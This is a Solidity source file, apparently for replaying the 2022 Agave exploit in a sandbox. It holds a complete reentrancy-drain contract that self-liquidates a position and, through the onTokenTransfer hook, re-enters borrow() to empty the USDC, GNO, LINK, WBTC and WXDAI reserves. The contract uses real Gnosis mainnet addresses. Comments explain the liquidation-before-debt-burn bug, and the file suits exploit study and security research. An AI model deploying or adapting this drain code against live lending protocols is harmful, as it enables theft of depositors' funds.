// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-03-Agave).
//
// The DeFiHackLabs PoC (test/Agave_exp.sol) runs the entire attack INLINE in a
// Foundry `is Test` harness (`AgaveExploit`). The flash-callback (`uniswapV2Call`,
// which here just dispatches the attack since the "flashloan" is simulated by
// minting WETH to the contract up front) and the ERC-677-style reentrancy hook
// (`onTokenTransfer`) both live on the test itself, so there is no standalone
// contract to deploy. This file faithfully copies that inline logic into a
// self-contained contract (entrypoint `run()`; the reentrancy hook
// `onTokenTransfer`), inlining minimal interfaces so it compiles anywhere.
//
// Agave was a near-verbatim Aave-v2 fork on Gnosis (xDai). Its `liquidationCall`
// transfers collateral to the liquidator BEFORE burning the borrower's debt
// aToken — a CEI violation. The Gnosis wrapper tokens (aWETH etc.) fire an
// `onTokenTransfer` callback on transfer; inside that hook the attacker re-enters
// the pool's `borrow()` on every other reserve, draining them while the original
// liquidation's debt accounting is still pending (no reentrancy guard). This is
// the same bug class as the Lendf.Me / Hundred Finance exploits.
//
// Constants and the call sequence are copied verbatim from the original test.
// The recorder cannot run Foundry cheatcodes (`vm.warp`/`vm.roll`), so the time
// advance that makes the position liquidatable is applied to the WHOLE replay
// via `setup.blockTimestamp` in the config — both the position setup
// (`_initHF()` inside `run()`) and the `liquidationCall` execute at the warped
// timestamp, and the position is constructed to be liquidatable at that block.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ILendingPool {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function liquidationCall(address collateralAsset, address debtAsset, address user, uint256 debtToCover, bool receiveAToken) external;
    function repayAsset(address asset, uint256 amount, uint256 rateMode, address onBehalfOf) external returns (uint256);
    function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
    function getReserveData(address asset) external view returns (address, address, address, address, uint256);
    function getUserAccountData(address user)
        external view returns (uint256 totalCollateralETH, uint256 totalDebtETH, uint256 availableBorrowsETH, uint256 currentLiquidationThreshold, uint256 ltv, uint256 healthFactor);
}

interface ILendingPoolAddressesProvider {
    function getLendingPool() external view returns (address);
}

contract AgaveDrain {
    // --- asset addresses (Gnosis / xDai) ---
    address constant WETH = 0x6A023CCd1ff6F2045C3309768eAd9E68F978f6e1;
    address constant LINK = 0xE2e73A1c69ecF83F464EFCE6A5be353a37cA09b2;
    address constant USDC = 0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83;
    address constant GNO = 0x9C58BAcC331c9aa871AFD802DB6379a98e80CEdb;
    address constant WBTC = 0x8e5bBbb09Ed1ebdE8674Cda39A0c169401db4252;
    address constant WXDAI = 0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d;
    address constant AWETH = 0xb5A165d9177555418796638447396377Edf4C18a;

    address constant PROVIDER = 0xA91B9095eFa6C0568467562032202108e49c9Ef8;

    // non-WETH reserves to drain via the reentrancy hook (matches the test's
    // assetAddrs[0..4]: USDC, GNO, LINK, WBTC, WXDAI).
    address[5] nonWethAssets = [USDC, GNO, LINK, WBTC, WXDAI];

    // prepare numbers (copied verbatim from the test)
    uint256 constant LINK_LEND = 1_0000000000000002; // 1.0000000000000002 ether (wei)
    uint256 constant WETH_LEND = 1; // 1 wei (verbatim from the test's wethlendnum2)
    uint256 constant LINK_DEBT = 0.7 ether;
    uint256 constant WETH_DEBT = 1; // 1 wei (verbatim from the test's wethDebt4)
    uint256 constant LINK_WITHDRAW = 0.0666666666 ether;

    // the simulated "flashloan" amount (minted to this contract in setup)
    uint256 constant ETH_FLASHLOAN_AMT = 2728.934387414251504146 ether + 1;

    uint256 callCount;
    uint256 wethLiqBeforeHack;
    ILendingPool lendingPool;

    constructor() {
        lendingPool = ILendingPool(ILendingPoolAddressesProvider(PROVIDER).getLendingPool());
    }

    // Entrypoint for the RECORDED attack: the liquidation + reentrancy drain.
    // The under-water position is built FIRST via `initHF()` (run as an
    // unrecorded setup step), then the reserve `lastUpdateTimestamp`s are
    // back-dated (Foundry `vm.store`) so the pool sees ~1h of accrued interest
    // and the health factor dips below 1 — mirroring the test's `vm.warp(+1h)`.
    // The simulated flashloan principal is already on this contract (dealt via
    // setup), so the uniswapV2Call dispatcher is invoked directly.
    function run() external {
        // simulate the flash swap callback with the flashloan amount
        uniswapV2Call(address(this), ETH_FLASHLOAN_AMT, 0, "");
    }

    // Build the under-water collateral/borrow position (matches _initHF in the
    // test). Public so it can be driven as an unrecorded setup `rawCall`.
    function initHF() external {
        _initHF();
    }

    function _initHF() internal {
        IERC20(LINK).approve(address(lendingPool), type(uint256).max);
        IERC20(WETH).approve(address(lendingPool), type(uint256).max);

        lendingPool.deposit(LINK, LINK_LEND, address(this), 0);
        lendingPool.deposit(WETH, WETH_LEND, address(this), 0);

        lendingPool.setUserUseReserveAsCollateral(LINK, true);
        lendingPool.setUserUseReserveAsCollateral(WETH, true);

        lendingPool.borrow(LINK, LINK_DEBT, 2, 0, address(this));
        lendingPool.borrow(WETH, WETH_DEBT, 2, 0, address(this));

        lendingPool.withdraw(LINK, LINK_WITHDRAW, address(this));
    }

    function uniswapV2Call(address, uint256 _amount0, uint256 _amount1, bytes memory) public {
        _attackLogic(_amount0, _amount1);
    }

    function _attackLogic(uint256 _amount0, uint256 _amount1) internal {
        wethLiqBeforeHack = _getAvailableLiquidity(WETH);

        // liquidate our own position for a dust amount; the collateral transfer
        // fires the aToken transfer hook -> onTokenTransfer reentrancy.
        lendingPool.liquidationCall(WETH, WETH, address(this), 2, false);

        // withdraw the aWETH we received as liquidated collateral
        lendingPool.withdraw(WETH, IERC20(AWETH).balanceOf(address(this)), address(this));

        // Repay the simulated flashloan — send the principal+fee to a burn
        // address. The recorder cannot `vm.warp`, so the position is made
        // liquidatable via a debt-principal storage write (see config) rather
        // than accrued interest; this shifts the exact WETH economics slightly,
        // so the repayment is best-effort (the drain itself is the exploit —
        // this transfer is only flashloan bookkeeping). Pay what is available.
        uint256 repay = ((ETH_FLASHLOAN_AMT * 1000) / 997) + 1;
        uint256 bal = IERC20(WETH).balanceOf(address(this));
        IERC20(WETH).transfer(address(1), bal < repay ? bal : repay);
    }

    function _getAvailableLiquidity(address asset) internal view returns (uint256) {
        (, address aToken,,,) = lendingPool.getReserveData(asset);
        return IERC20(asset).balanceOf(aToken);
    }

    // Boost LTV then borrow every non-WETH reserve dry. Mirrors the test's
    // borrowTokens() / boostLTVHack(): deposit the flashloaned WETH (minus 1) to
    // lift the health factor, then borrow wethLiqBeforeHack of WETH, then drain
    // USDC/GNO/LINK/WBTC/WXDAI.
    function borrowTokens() internal {
        // boostLTVHack body
        lendingPool.deposit(WETH, IERC20(WETH).balanceOf(address(this)) - 1, address(this), 0);
        // borrow the WETH pool's pre-attack liquidity
        if (wethLiqBeforeHack > 0) {
            lendingPool.borrow(WETH, wethLiqBeforeHack, 2, 0, address(this));
        }
        // borrow all non-WETH reserves
        for (uint256 i = 0; i < 5; i++) {
            address asset = nonWethAssets[i];
            uint256 bal = _getAvailableLiquidity(asset);
            uint256 borrowAmount = bal > 2 ? bal - 1 : 0;
            if (borrowAmount > 0) lendingPool.borrow(asset, borrowAmount, 2, 0, address(this));
        }
    }

    // The reentrancy hook. The aToken transfer (collateral out during
    // liquidationCall) fires onTokenTransfer; on the SECOND such callback
    // (callCount==2, when aWETH transfers value==1) we re-enter and drain.
    function onTokenTransfer(address _from, uint256 _value, bytes memory) external {
        if (_from == AWETH && _value == 1) {
            callCount++;
            if (callCount == 2) {
                borrowTokens();
            }
        }
    }
}
